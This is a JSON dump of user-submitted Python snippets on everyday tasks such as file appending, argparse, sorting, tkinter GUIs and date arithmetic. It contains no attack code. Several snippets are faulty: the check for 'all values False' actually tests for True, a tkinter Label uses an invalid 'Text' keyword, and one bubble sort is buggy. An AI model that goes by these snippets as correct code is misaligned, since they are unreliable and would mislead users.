    "title": " python append to file",
    "description": "file = open(\"text.txt\", \"w\")  file.write(\"Your text goes here\")  file.close()  'r' open for reading (default) 'w' open for writing, truncating the file first 'x' open for exclusive creation, failing if the file already exists 'a' open for writing, appending to the end of the file if it exists\nwith open(filename, \"a+\") as f:   f.write('Hello World')\n# Open a file with access mode 'a' file_object = open('sample.txt', 'a')   # Append 'hello' at the end of file file_object.write('hello')   # Close the file file_object.close() \nf = open(filelocation/name, \"a\") f.write(\"Now the file has more content!\") f.close()  #open and read the file after the appending: f = open(\"C:/test/input.txt\", \"r\") print(f.read())\nfile = open(&ldquo;testfile.txt&rdquo;, &ldquo;r+&rdquo;) \n",
    "reg_date": "2021-10-12T11:32:46.000Z"
  },
  {
    "id": 3038,
    "keyword": null,
    "link": null,
    "title": " python append vs extend",
    "description": "my_list = [23, 11, 42, 24523]  # append will add it as if you're adding a new list to it my_list.append([34523, 76979]) print(my_list)  # extend will go over each item in the new source list and add each # element as part of the target list (my_list) my_list.extend([12, 99]) print(my_list)  \"\"\"  Output: [23, 11, 42, 24523, [34523, 76979]] [23, 11, 42, 24523, [34523, 76979], 12, 99] \"\"\"\nThe extend() method adds the specified list elements (or any iterable) to the end of the current list.\n",
    "reg_date": "2021-10-12T11:32:46.000Z"
  },
  {
    "id": 3039,
    "keyword": null,
    "link": null,
    "title": " python argparse",
    "description": "import argparse  parser = argparse.ArgumentParser() parser.add_argument(\"-n\", \"--name\", help=\"Name of thing\") parser.add_argument(\"-s\", \"--size\", help=\"Size of thing\", type=int) args = parser.parse_args()  print(args.name, args.size)\nimport argparse  # construct the argument parse and parse the arguments ap = argparse.ArgumentParser() ap.add_argument(\"-n\", \"--name\", required=True, help=\"name of the user\") args = vars(ap.parse_args())  # display a friendly message to the user print(\"Hi there {}, it's nice to meet you!\".format(args[\"name\"]))\nimport argparse  parser = argparse.ArgumentParser()  # By default it will fail with multiple arguments. parser.add_argument('--default')  # Telling the type to be a list will also fail for multiple arguments, # but give incorrect results for a single argument. parser.add_argument('--list-type', type=list)  # This will allow you to provide multiple arguments, but you will get # a list of lists which is not desired. parser.add_argument('--list-type-nargs', type=list, nargs='+')  # This is the correct way to handle accepting multiple arguments. # '+' == 1 or more. # '*' == 0 or more. # '?' == 0 or 1. # An int is an explicit number of arguments to accept. parser.add_argument('--nargs', nargs='+')  # To make the input integers parser.add_argument('--nargs-int-type', nargs='+', type=int)  # An alternate way to accept multiple inputs, but you must # provide the flag once per input. Of course, you can use # type=int here if you want. parser.add_argument('--append-action', action='append')  # To show the results of the given option to screen. for _, value in parser.parse_args()._get_kwargs():     if value is not None:         print(value) \nimport argparse  if __name__ == \"__main__\": \t#add a description \tparser = argparse.ArgumentParser(description=\"what the program does\")  \t#add the arguments \tparser.add_argument(\"arg1\", help=\"advice on arg\") \tparser.add_argument(\"arg2\", help=\"advice on arg\") #\t\t\t\t\t\t. # \t\t\t\t\t\t. #   \t\t\t\t\t. \tparser.add_argument(\"argn\", help=\"advice on arg\")  \t#this allows you to access the arguments via the object args \targs = parser.parse_args()  \t#how to use the arguments \targs.arg1, args.arg2 ... args.argn\nimport argparse  parser = argparse.ArgumentParser() parser.add_argument('file', type=argparse.FileType('r')) args = parser.parse_args()  print(args.file.readlines())\nparser.add_argument(\"-v\", \"--verbose\", action=\"store_true\",                     default=\"your default value\", help=\"verbose output\")\n",
    "reg_date": "2021-10-12T11:32:46.000Z"
  },
  {
    "id": 3040,
    "keyword": null,
    "link": null,
    "title": " python argparse ignore unrecognized arguments",
    "description": "# replace args = parser.parse_args() # with args, unknown = parser.parse_known_args()\n",
    "reg_date": "2021-10-12T11:32:47.000Z"
  },
  {
    "id": 3041,
    "keyword": null,
    "link": null,
    "title": " python array colon",
    "description": "a[start:stop]  # items start through stop-1 a[start:]      # items start through the rest of the array a[:stop]       # items from the beginning through stop-1 a[:]           # a copy of the whole array\n>>> a=[1,2,3,4,5] >>> a[1:3] [2, 3] >>> a[:3] [1, 2, 3] >>> a[2:] [3, 4, 5] >>> s='computer' >>> s[:3] 'com' >>> s[3:6] 'put'\n",
    "reg_date": "2021-10-12T11:32:47.000Z"
  },
  {
    "id": 3042,
    "keyword": null,
    "link": null,
    "title": " python array delete last column",
    "description": "b = np.delete(a, -1, axis=1) \n",
    "reg_date": "2021-10-12T11:32:47.000Z"
  },
  {
    "id": 3043,
    "keyword": null,
    "link": null,
    "title": " python array index range",
    "description": "a[start:stop]  # items start through stop-1 a[start:]      # items start through the rest of the array a[:stop]       # items from the beginning through stop-1 a[:]           # a copy of the whole array\na[-1]    # last item in the array a[-2:]   # last two items in the array a[:-2]   # everything except the last two items \n>>> new_list = [1, 2, 3, 4, 5, 6, 7, 8, 9] >>> print(new_list[5:9]) [6, 7, 8, 9]\n",
    "reg_date": "2021-10-12T11:32:47.000Z"
  },
  {
    "id": 3044,
    "keyword": null,
    "link": null,
    "title": " python auto clicker",
    "description": "#you need to install pyautogui like this: #py.exe -m pip install pyautogui #then... import pyautogui,time while True:     pyautogui.click(100,100)     time.sleep(0.5)\nimport pyautogui import time  def click():      time.sleep(0.5)          pyautogui.click()  def main():     for i in range(10):#you can set how much times you have to click in range(no. of times to click)          click()  main()\nimport threading from pynput.mouse import Button, Controller from pynput.keyboard import Listener, KeyCode   delay = 0.001 button = Button.left start_stop_key = KeyCode(char='s') exit_key = KeyCode(char='e')   class ClickMouse(threading.Thread):     def __init__(self, delay, button):         super(ClickMouse, self).__init__()         self.delay = delay         self.button = button         self.running = False         self.program_running = True      def start_clicking(self):         self.running = True      def stop_clicking(self):         self.running = False      def exit(self):         self.stop_clicking()         self.program_running = False      def run(self):         while self.program_running:             while self.running:                 mouse.click(self.button)                 time.sleep(self.delay)             time.sleep(0.1)   mouse = Controller() click_thread = ClickMouse(delay, button) click_thread.start()   def on_press(key):     if key == start_stop_key:         if click_thread.running:             click_thread.stop_clicking()         else:             click_thread.start_clicking()     elif key == exit_key:         click_thread.exit()         listener.stop()   with Listener(on_press=on_press) as listener:     listener.join()\nimport pyautogui #imports pyautogui import keyboard #imports keyboard   def autoclicker(): #declares the function     while True: #makes a infinite loop         pyautogui. click() #makes your mouse click         if keyboard.is_pressed('b'): #detects if b is pressed             break #if b is detected it breaks the loop   autoclicker()\ndef on_press(key):     if key == start_stop_key:         if click_thread.running:             click_thread.stop_clicking()\n",
    "reg_date": "2021-10-12T11:32:47.000Z"
  },
  {
    "id": 3045,
    "keyword": null,
    "link": null,
    "title": " python auto reload module ipython",
    "description": "%load_ext autoreload %autoreload 2\n",
    "reg_date": "2021-10-12T11:32:47.000Z"
  },
  {
    "id": 3046,
    "keyword": null,
    "link": null,
    "title": " python b to string",
    "description": "# utf-8 is used here because it is a very common encoding, but you # need to use the encoding your data is actually in. bytes = b'abcde' bytes.decode(\"utf-8\")  'abcde'\nb'hello'.decode(encoding=\"utf-8\") \n",
    "reg_date": "2021-10-12T11:32:47.000Z"
  },
  {
    "id": 3047,
    "keyword": null,
    "link": null,
    "title": " python background function",
    "description": "import threading def my_inline_function(some_args):     # do some stuff     download_thread = threading.Thread(target=some_function, name=\"Downloader\", args=some_args)     download_thread.start()     # continue doing stuff \n",
    "reg_date": "2021-10-12T11:32:47.000Z"
  },
  {
    "id": 3048,
    "keyword": null,
    "link": null,
    "title": " python bash command",
    "description": "import os os.system('clear') \nimport os cmd = \"git --version\" returned_value = os.system(cmd)  # returns the exit code in unix\nimport os os.system('cmd /k \"Your Command Prompt Command\"') \nimport subprocess subprocess.call([\"sudo\", \"apt\", \"update\"])\nimport subprocess subprocess.call([\"./shell.sh\"])  # Make sure that \"shell.sh\" has \"+x\" permissions\n",
    "reg_date": "2021-10-12T11:32:47.000Z"
  },
  {
    "id": 3049,
    "keyword": null,
    "link": null,
    "title": " python beautifulsoup example",
    "description": "import requests  from bs4 import BeautifulSoup  URL = 'https://the.website_you_want_to_visit.com' website = requests.get(URL) results = BeautifulSoup(website.content, 'html.parser')\ndef simple_get(url):     \"\"\"     Attempts to get the content at `url` by making an HTTP GET request.     If the content-type of response is some kind of HTML/XML, return the     text content, otherwise return None.     \"\"\"     try:         with closing(get(url, stream=True)) as resp:             if is_good_response(resp):                 return resp.content             else:                 return None      except RequestException as e:         log_error('Error during requests to {0} : {1}'.format(url, str(e)))         return None   def is_good_response(resp):     \"\"\"     Returns True if the response seems to be HTML, False otherwise.     \"\"\"     content_type = resp.headers['Content-Type'].lower()     return (resp.status_code == 200              and content_type is not None              and content_type.find('html') > -1)   def log_error(e):     \"\"\"     It is always a good idea to log errors.      This function just prints them, but you can     make it do anything.     \"\"\"     print(e) \n",
    "reg_date": "2021-10-12T11:32:47.000Z"
  },
  {
    "id": 3050,
    "keyword": null,
    "link": null,
    "title": " python beep windows",
    "description": "# https://stackoverflow.com/a/6537563 import winsound frequency = 2500  # Set Frequency To 2500 Hertz duration = 1000  # Set Duration To 1000 ms == 1 second winsound.Beep(frequency, duration)\n",
    "reg_date": "2021-10-12T11:32:48.000Z"
  },
  {
    "id": 3051,
    "keyword": null,
    "link": null,
    "title": " python border",
    "description": "from tkinter import * root = Tk()  example = Label(root, Text=\"Hello World!\", borderwidth=\"2\", relief=\"groove\") # Releif is the effect what goes with the border. #\" flat\", \"raised\", \"sunken\", \"ridge\", \"solid\" are relief commands too.  root.mainloop()\n",
    "reg_date": "2021-10-12T11:32:48.000Z"
  },
  {
    "id": 3052,
    "keyword": null,
    "link": null,
    "title": " python bounding box on image",
    "description": "# cv2.rectangle(img, pt1, pt2, color, thickness, lineType, shift) cv2.rectangle(img, (x1, y1), (x2, y2), (255,0,0), 2)  \"\"\" x1,y1 ------ |          | |          | |          | --------x2,y2 \"\"\"\n",
    "reg_date": "2021-10-12T11:32:48.000Z"
  },
  {
    "id": 3053,
    "keyword": null,
    "link": null,
    "title": " python bs4 install",
    "description": "pip install beautifulsoup4\npip install bs4 #this'll do the work\n",
    "reg_date": "2021-10-12T11:32:48.000Z"
  },
  {
    "id": 3054,
    "keyword": null,
    "link": null,
    "title": " python bubble sort",
    "description": "def bubbleSort(lis):     length = len(lis)     for i in range(length):         for j in range(length - i):             a = lis[j]             if a != lis[-1]:                 b = lis[j + 1]                 if a > b:                     lis[j] = b                     lis[j + 1] = a     return lis\ndef bubble_sort(arr):     x=-1     n=len(arr)#length of array 6     for i in range (0,n):         for j in range(1,n-i):             if arr[j-1]>arr[j]:                 arr[j-1],arr[j]=arr[j],arr[j-1]         if (n-i)<=1:             break     return arr              if \"__main__\"==__name__:     arr=[7,1,2,6,9,3,8,4]     result=bubble_sort(arr)     print(result)                 \ndef bubbleSort(arr):      n = len(arr)         # Traverse through all array elements      for i in range(n-1):      # range(n) also work but outer loop will repeat one time more than needed.             # Last i elements are already in place          for j in range(0, n-i-1):                 # traverse the array from 0 to n-i-1              # Swap if the element found is greater              # than the next element              if arr[j] > arr[j+1] :                  arr[j], arr[j+1] = arr[j+1], arr[j]     # Driver code to test above  arr = [64, 34, 25, 12, 22, 11, 90]     bubbleSort(arr)\ndef bubble_sort(arr):     def swap(i, j):         arr[i], arr[j] = arr[j], arr[i]      n = len(arr)     swapped = True          x = -1     while swapped:         swapped = False         x = x + 1         for i in range(1, n-x):             if arr[i - 1] > arr[i]:                 swap(i - 1, i)                 swapped = True                          return arr\ndef bubble(st):     for i in range(len(st),1,-1):         for j in range(0,i-1):             if st[j]>st[j+1]:                 st[j],st[j+1]=st[j+1],st[j]             else:                 pass     print(st) bubble([64, 34, 25, 12, 22, 11, 90] )\ndef bubbleSort(arr):      n = len(arr)         # Traverse through all array elements      for i in range(n-1):      # range(n) also work but outer loop will repeat one time more than needed.             # Last i elements are already in place          for j in range(0, n-i-1):                 # traverse the array from 0 to n-i-1              # Swap if the element found is greater              # than the next element              if arr[j] > arr[j+1] :                  arr[j], arr[j+1] = arr[j+1], arr[j]     # Driver code to test above  arr = [10, 51, 2, 18, 4, 31, 13, 5, 23, 64, 29]     bubbleSort(arr) print (\"Sorted array is:\")  for i in range(len(arr)):      print (\"%d\" %arr[i]),  \n",
    "reg_date": "2021-10-12T11:32:48.000Z"
  },
  {
    "id": 3055,
    "keyword": null,
    "link": null,
    "title": " python bytes to dict",
    "description": "# credit to the Stack Overflow user in the source linnk # Python3  import ast  byte_str = b\"{'one': 1, 'two': 2}\" dict_str = byte_str.decode(\"UTF-8\") my_data = ast.literal_eval(dict_str)  print(repr(my_data)) >>> {'one': 1, 'two': 2}\n# You can use indent option in json.dumps() to obtain \\n symbols:  \timport json  \tuser_dict = {'name': 'dinesh', 'code': 'dr-01'} \tuser_encode_data = json.dumps(user_dict, indent=2).encode('utf-8') \tprint(user_encode_data)  # Output: \tb'{\\n  \"name\": \"dinesh\",\\n  \"code\": \"dr-01\"\\n}'\n",
    "reg_date": "2021-10-12T11:32:48.000Z"
  },
  {
    "id": 3056,
    "keyword": null,
    "link": null,
    "title": " python calc days between dates",
    "description": "from datetime import date  d0 = date(2008, 8, 18) d1 = date(2008, 9, 26) delta = d1 - d0 print(delta.days)\n",
    "reg_date": "2021-10-12T11:32:48.000Z"
  },
  {
    "id": 3057,
    "keyword": null,
    "link": null,
    "title": " python calculate age from date of birth",
    "description": "from datetime import date  def calculate_age(born):     today = date.today()     return today.year - born.year - ((today.month, today.day) < (born.month, born.day))\nYear_of_birth = int(input(\"In which year you took birth:- \")) current_year = datetime.datetime.now().year Current_age = current_year - Year_of_birth print(\"Your current age is \",Current_age)\ntoday_date = datetime.datetime.now() dob = datetime.datetime(1982, 5, 20) print(today_date - dob)\n#Python Calculate Age from date of birth:  from datetime import date  def calculate_age(born):     today = date.today()     return today.year - born.year - ((today.month, today.day) < (born.month, born.day))\n",
    "reg_date": "2021-10-12T11:32:48.000Z"
  },
  {
    "id": 3058,
    "keyword": null,
    "link": null,
    "title": " python calculate computation time",
    "description": "import time  begin = time.time() ''' your script here ''' time.sleep(1)  # store end time  end = time.time()  # total time taken  print(f\"Total runtime of the program is {end - begin}\")  # https://www.geeksforgeeks.org/python-measure-time-taken-by-program-to-execute/\n",
    "reg_date": "2021-10-12T11:32:48.000Z"
  },
  {
    "id": 3059,
    "keyword": null,
    "link": null,
    "title": " python calculate factorial",
    "description": "def factorial(n):     fact = 1     for num in range(2, n + 1):         fact = fact * num     return(fact)\ndef factorial(n):     if n == 0:         return 1     else:         return n * factorial(n-1) n=int(input(\"Input a number to compute the factiorial : \")) print(factorial(n))  \n",
    "reg_date": "2021-10-12T11:32:48.000Z"
  },
  {
    "id": 3060,
    "keyword": null,
    "link": null,
    "title": " python calculate prime numbers until numer",
    "description": "until = 20 [n for n in range(2, until) if all(n % m != 0 for m in range(2, n-1))]\nn = 20 primes = []  for i in range(2, n + 1): \tfor j in range(2, int(i ** 0.5) + 1):  \t\tif i%j == 0:  \t\t\tbreak \telse: \t\tprimes.append(i)  print(primes)\nlower = int(input(\"Enter lower range: \"))   upper = int(input(\"Enter upper range: \"))      for num in range(lower,upper + 1):      if num > 1:          for i in range(2,num):              if (num % i) == 0:                  break          else:              print(num)  \n",
    "reg_date": "2021-10-12T11:32:49.000Z"
  },
  {
    "id": 3061,
    "keyword": null,
    "link": null,
    "title": " python calculate time taken",
    "description": "import time start = time.process_time() # your code here     print(time.process_time() - start)\n",
    "reg_date": "2021-10-12T11:32:49.000Z"
  },
  {
    "id": 3062,
    "keyword": null,
    "link": null,
    "title": " python calculator gui",
    "description": "from tkinter import *   def adding():     try:         text1 = int(Textbox1.get())         text2 = int(Textbox2.get())     except Exception:         Output.delete(0, END)         Output.insert(0, 'Error! Enter a number please!')         return     text_output = str(text1 + text2)     Output.delete(0, END)     Output.insert(0, text_output)  root = Tk() root.title('Adding') root.geometry('500x500') Textbox1 = Entry(root) Textbox1.pack(ipadx=50, ipady=10) spacing = Label(root, text='+') spacing.pack() Textbox2 = Entry(root) Textbox2.pack(ipadx=50, ipady=10) spacing2 = Label(root) spacing2.pack() Button1 = Button(root, text='Add The numbers!', command=adding) Button1.pack() spacing3 = Label(root) spacing3.pack() Output = Entry(root) Output.pack(ipadx=50) root.mainloop() \nfrom tkinter import *   class Calculator:     def __init__(self,master):         self.master = master         master.title(\"My Calculator @ www.pickupbrain.com\")         master.configure(bg='#C0C0C0')                   #creating screen widget         self.screen = Text(master, state='disabled', width=50,height= 3, background=\"#EAFAF1\", foreground=\"#000000\",font=(\"Arial\",15,\"bold\"))                   #Screen position in window         self.screen.grid(row=0,column=0,columnspan=4,padx=2,pady=2)         self.screen.configure(state='normal')                   #initialize screen value as empty         self.equation=''                   #create buttons         b1 = self.createButton(7)         b2 = self.createButton(8)         b3 = self.createButton(9)         b4 = self.createButton(u\"\\u232B\",None)         b5 = self.createButton(4)         b6 = self.createButton(5)         b7 = self.createButton(6)         b8 = self.createButton(u\"\\u00F7\")         b9 = self.createButton(1)         b10 = self.createButton(2)         b11 = self.createButton(3)         b12 = self.createButton('*')         b13 = self.createButton('.')         b14 = self.createButton(0)         b15 = self.createButton('+')         b16 = self.createButton('-')         b17 = self.createButton('=', None,35)                   #stored all buttons in list         buttons = [b1,b2,b3,b4,b5,b6,b7,b8,b9,b10,b11,b12,b13,b14,b15,b16,b17]                   #initalize counter         count=0                   #arrange buttons with grid manager         for row in range(1,5):             for column in range(4):                 buttons[count].grid(row = row, column= column,padx=0,pady=0)                 count +=1                                   #arrange last button '=' at the bottom             buttons[16].grid(row=5,column=0,columnspan=4)                       def createButton(self,val,write=True,width=8):                   #this function creates a button and takes one compulsary argument, the value that should be on the button         return Button(self.master,text=val,command= lambda:self.click(val,write),width=width,background=\"#ffffff\",foreground =\"#1f4bff\",font=(\"times\",20,\"bold\"))                       def click(self,text,write):         #this function handles the actions when you         #click a button 'write' arguement, if true         #than value val should be written on screen,         #if none then should not be written on screen         if write == None:                           #Evaluates when there is an equation to be evaluated             if text == '=' and self.equation:                 #replace the unicode values of division ./. with python division                 #symbol / using regex                 self.equation = re.sub(u\"\\u00F7\", '/', self.equation)                 print(self.equation)                 answer = str(eval(self.equation))                 self.clear_screen()                 self.insert_screen(answer,newline = True)             elif text == u\"\\u232B\":                 self.clear_screen()                       else:             #add text to screen                 self.insert_screen(text)                       def clear_screen(self):         #to clear screen         #set equation to empty before deleteing screen         self.equation = ''         self.screen.configure(state = 'normal')         self.screen.delete('1.0', END)                           def insert_screen(self, value, newline = False):         self.screen.configure(state ='normal')         self.screen.insert(END,value)                   #record every value inserted in screen         self.equation += str(value)         self.screen.configure(state = 'disabled')                       def calci():           #Function that creates calculator GUI     root = Tk()     my_gui = Calculator(root)     root.mainloop()       # Running Calculator     calci()                                     \n# importing everyting from tkinter from tkinter import * # expression to access among all the functions expression = \"\" # functions def input_number(number, equation):    # accessing the global expression variable    global expression    # concatenation of string    expression = expression + str(number)    equation.set(expression) def clear_input_field(equation):    global expression    expression = \"\"    # setting empty string in the input field    equation.set(\"Enter the expression\") def evaluate(equation): global expression # trying to evaluate the expression try: result = str(eval(expression)) # showing the result in the input field equation.set(result) # setting expression to empty string expression = \"\" except: # some error occured # showing it to the user equation.set(\"Enter a valid expression\") expression = \"\" # creating the GUI def main():    # main window window = Tk()    # setting the title of GUI window    window.title(\"Calculator\")    # set the configuration of GUI window    window.geometry(\"325x175\")    # varible class instantiation    equation = StringVar()    # input field for the expression    input_field = Entry(window, textvariable=equation)    input_field.place(height=100)    # we are using grid position    # for the arrangement of the widgets    input_field.grid(columnspan=4, ipadx=100, ipady=5)    # settin the placeholder message for users    equation.set(\"Enter the expression\")    # creating buttons and placing them at respective positions    _1 = Button(window, text='1', fg='white', bg='black', bd=0, command=lambda: input_number(1, equation), height=2, width=7)    _1.grid(row=2, column=0)    _2 = Button(window, text='2', fg='white', bg='black', bd=0, command=lambda: input_number(2, equation), height=2, width=7)    _2.grid(row=2, column=1)    _3 = Button(window, text='3', fg='white', bg='black', bd=0, command=lambda: input_number(3, equation), height=2, width=7)    _3.grid(row=2, column=2)    _4 = Button(window, text='4', fg='white', bg='black', bd=0, command=lambda: input_number(4, equation), height=2, width=7)    _4.grid(row=3, column=0)    _5 = Button(window, text='5', fg='white', bg='black', bd=0, command=lambda: input_number(5, equation), height=2, width=7)    _5.grid(row=3, column=1)    _6 = Button(window, text='6', fg='white', bg='black', bd=0, command=lambda: input_number(6, equation), height=2, width=7)    _6.grid(row=3, column=2)    _7 = Button(window, text='7', fg='white', bg='black', bd=0, command=lambda: input_number(7, equation), height=2, width=7)    _7.grid(row=4, column=0)    _8 = Button(window, text='8', fg='white', bg='black', bd=0, command=lambda: input_number(8, equation), height=2, width=7)    _8.grid(row=4, column=1)    _9 = Button(window, text='9', fg='white', bg='black', bd=0, command=lambda: input_number(9, equation), height=2, width=7)    _9.grid(row=4, column=2)    _0 = Button(window, text='0', fg='white', bg='black', bd=0, command=lambda: input_number(0, equation), height=2, width=7)    _0.grid(row=5, column=0)    plus = Button(window, text='+', fg='white', bg='black', bd=0, command=lambda: input_number('+', equation), height=2, width=7)    plus.grid(row=2, column=3)    minus = Button(window, text='-', fg='white', bg='black', bd=0, command=lambda: input_number('-', equation), height=2, width=7)    minus.grid(row=3, column=3)    multiply = Button(window, text='*', fg='white', bg='black', bd=0, command=lambda:  input_number('*', equation), height=2, width=7)    multiply.grid(row=4, column=3)    divide = Button(window, text='/', fg='white', bg='black', bd=0, command=lambda: input_number('/', equation), height=2, width=7)    divide.grid(row=5, column=3)    equal = Button(window, text='=', fg='white', bg='black', bd=0, command=lambda: evaluate(equation), height=2, width=7)    equal.grid(row=5, column=2)    clear = Button(window, text='Clear', fg='white', bg='black', bd=0, command=lambda: clear_input_field(equation), height=2, width=7)    clear.grid(row=5, column=1)    # showing the GUI    window.mainloop() # start of the program if __name__ == '__main__':       main() \n",
    "reg_date": "2021-10-12T11:32:49.000Z"
  },
  {
    "id": 3063,
    "keyword": null,
    "link": null,
    "title": " python capitalize all words",
    "description": "sample_text = \"this is a sample string\" result = sample_text.title() # \"This Is A Sample String\"\nstring=str(\"caPiTalIZE\") print(string.capitalize()) \t#output : Capitalize\nstring_name.capitalize() \n",
    "reg_date": "2021-10-12T11:32:49.000Z"
  },
  {
    "id": 3064,
    "keyword": null,
    "link": null,
    "title": " python catch all exceptions",
    "description": "try:   # some code except Exception as e: \tprint(\"ERROR : \"+str(e))\ntry:     raise Exception(\"Oh no! An error happened!\") except Exception as err:     print(\"An error was handled\") finally:   \tprint(\"This runs either way.\")\nexcept (IDontLikeYouException, YouAreBeingMeanException) as e:     pass\ntry:   print(\"I will try to print this line of code\") except ERROR_NAME:   print(\"I will print this line of code if error ERROR_NAME is encountered\")\nimport sys try: \tS = 1/0 #Create Error except: # catch *all* exceptions     e = sys.exc_info()     print(e) # (Exception Type, Exception Value, TraceBack)  ############ #    OR    # ############ try: \tS = 1/0 except ZeroDivisionError as e:     print(e) # ZeroDivisionError('division by zero')\ntry:     do_something() except:     print \"Caught it!\"\n",
    "reg_date": "2021-10-12T11:32:49.000Z"
  },
  {
    "id": 3065,
    "keyword": null,
    "link": null,
    "title": " python cd to directory",
    "description": "import os os.chdir(path)\nimport os  os.chdir(os.path.dirname(__file__))\nos.chdir(path)\n",
    "reg_date": "2021-10-12T11:32:49.000Z"
  },
  {
    "id": 3066,
    "keyword": null,
    "link": null,
    "title": " python cd to script directory",
    "description": "import os os.chdir(path)\nimport os  os.chdir(os.path.dirname(__file__))\n",
    "reg_date": "2021-10-12T11:32:49.000Z"
  },
  {
    "id": 3067,
    "keyword": null,
    "link": null,
    "title": " python ceiling",
    "description": "import math  n = 2.5  print(str(math.ceil(n)))\nimport math x = 3.86356 math.floor(x) #Returns: 3 math.ceil(x) #Returns: 4\nimport math print(math.ceil(5.3)) output = 6\ndef ceildiv(a, b):     return -(-a // b)\n",
    "reg_date": "2021-10-12T11:32:49.000Z"
  },
  {
    "id": 3068,
    "keyword": null,
    "link": null,
    "title": " python center main window on screen",
    "description": "# Centering Root Window on Screen   from tkinter import *    root = Tk()   # Gets the requested values of the height and widht. windowWidth = root.winfo_reqwidth() windowHeight = root.winfo_reqheight() print(\"Width\",windowWidth,\"Height\",windowHeight)   # Gets both half the screen width/height and window width/height positionRight = int(root.winfo_screenwidth()/2 - windowWidth/2) positionDown = int(root.winfo_screenheight()/2 - windowHeight/2)   # Positions the window in the center of the page. root.geometry(\"+{}+{}\".format(positionRight, positionDown))     root.mainloop()\n",
    "reg_date": "2021-10-12T11:32:49.000Z"
  },
  {
    "id": 3069,
    "keyword": null,
    "link": null,
    "title": " python cgi get raw post data",
    "description": "import sys formData = sys.stdin.read()\n",
    "reg_date": "2021-10-12T11:32:49.000Z"
  },
  {
    "id": 3070,
    "keyword": null,
    "link": null,
    "title": " python change base function",
    "description": ">>>import numpy as np >>>np.base_repr(10, base=3) '101' \n",
    "reg_date": "2021-10-12T11:32:49.000Z"
  },
  {
    "id": 3071,
    "keyword": null,
    "link": null,
    "title": " python change column order in dataframe",
    "description": "df = df.reindex(columns=column_names)\ncols = df.columns.tolist() cols = cols[-1:] + cols[:-1] #bring last element to 1st position df = df.reindex(cols, axis=1)\nIn [39]: df Out[39]:            0         1         2         3         4  mean 0  0.172742  0.915661  0.043387  0.712833  0.190717     1 1  0.128186  0.424771  0.590779  0.771080  0.617472     1 2  0.125709  0.085894  0.989798  0.829491  0.155563     1 3  0.742578  0.104061  0.299708  0.616751  0.951802     1 4  0.721118  0.528156  0.421360  0.105886  0.322311     1 5  0.900878  0.082047  0.224656  0.195162  0.736652     1 6  0.897832  0.558108  0.318016  0.586563  0.507564     1 7  0.027178  0.375183  0.930248  0.921786  0.337060     1 8  0.763028  0.182905  0.931756  0.110675  0.423398     1 9  0.848996  0.310562  0.140873  0.304561  0.417808     1  In [40]: df = df[['mean', 4,3,2,1]] \n",
    "reg_date": "2021-10-12T11:32:50.000Z"
  },
  {
    "id": 3072,
    "keyword": null,
    "link": null,
    "title": " python change cwd to script directory",
    "description": "os.chdir(os.path.dirname(os.path.abspath(__file__)))\nabspath = os.path.abspath(__file__) dname = os.path.dirname(abspath) os.chdir(dname)\n",
    "reg_date": "2021-10-12T11:32:50.000Z"
  },
  {
    "id": 3073,
    "keyword": null,
    "link": null,
    "title": " python change label text with button",
    "description": "from tkinter import *  root = Tk()  # Option 1: def changeText():   label.set(\"Updated text\")  label = StringVar() label.set(\"Test text\")  Label(root, textvariable=label).pack() Button(root, text=\"Change text\", command=changeText).pack()  # Option 2: def change_text():   my_label.config(text=\"New text\")  global my_label my_label = Label(root, text=\"First text\") my_label.pack(pady=5)  my_button = Button(root, text=\"Change text\", command=change_text) my_button.pack()  root.mainloop()\n",
    "reg_date": "2021-10-12T11:32:50.000Z"
  },
  {
    "id": 3074,
    "keyword": null,
    "link": null,
    "title": " python change plot transparency",
    "description": "# Basic syntax: plt.plot(data, alpha=0.5)  # Note, the alpha parameter goes from 0 (fully transparent) to 1  # \t(fully solid). It is especially useful when plotting overlapping # \thistograms. \n",
    "reg_date": "2021-10-12T11:32:50.000Z"
  },
  {
    "id": 3075,
    "keyword": null,
    "link": null,
    "title": " python change working directory to file directory",
    "description": "import os  abspath = os.path.abspath(__file__) dname = os.path.dirname(abspath) os.chdir(dname)\nimport os os.chdir(new_working_directory)\n",
    "reg_date": "2021-10-12T11:32:50.000Z"
  },
  {
    "id": 3076,
    "keyword": null,
    "link": null,
    "title": " python check array param",
    "description": "isinstance([0, 10, 20, 30], list) \t\t# True isinstance(50, list)\t\t\t\t\t# False\n",
    "reg_date": "2021-10-12T11:32:50.000Z"
  },
  {
    "id": 3077,
    "keyword": null,
    "link": null,
    "title": " python check file extension",
    "description": "# Checking for single extension (.txt) of file if file.endswith(\".txt\"):   # do something    # Checking multiple extensions (.txt, .pdf, .mp3, ...) if file.endswith((\".txt\", \".pdf\", \".mp3\")):   # do something\n",
    "reg_date": "2021-10-12T11:32:50.000Z"
  },
  {
    "id": 3078,
    "keyword": null,
    "link": null,
    "title": " python check if a file is empty",
    "description": "import os if os.stat(\"yourfile.extension\").st_size == 0: #note: file has to be in same directory as python script#   print('empty')\n>>> import os >>> os.stat(\"file\").st_size == 0 True\n",
    "reg_date": "2021-10-12T11:32:50.000Z"
  },
  {
    "id": 3079,
    "keyword": null,
    "link": null,
    "title": " python check if all dictionary values are False",
    "description": "if all(value == True for value in your_dict.values()) == True:   #DO SOMETHING\n",
    "reg_date": "2021-10-12T11:32:50.000Z"
  },
  {
    "id": 3080,
    "keyword": null,
    "link": null,
    "title": " python check if file exists",
    "description": "import os  os.path.exists(\"file.txt\") # Or folder, will return true or false\nimport os.path  if os.path.isfile('filename.txt'):     print (\"File exist\") else:     print (\"File not exist\") \nimport os.path  if os.path.isfile('filename.txt'):     print (\"File exist\") else:     print (\"File not exist\")\nimport os.path  if os.path.exists('filename.txt'):     print (\"File exist\") else:     print (\"File not exist\")\n#using pathlib from pathlib import Path  file_name = Path(\"file.txt\") if file_name.exists():     print(\"exists\")  else:     print(\"does not exist\") \nimport os.path os.path.exists(file_path) \n",
    "reg_date": "2021-10-12T11:32:51.000Z"
  },
  {
    "id": 3081,
    "keyword": null,
    "link": null,
    "title": " python check if file has content",
    "description": ">>> import os >>> os.stat(\"file\").st_size == 0 True\n",
    "reg_date": "2021-10-12T11:32:51.000Z"
  },
  {
    "id": 3082,
    "keyword": null,
    "link": null,
    "title": " python check if folder exists",
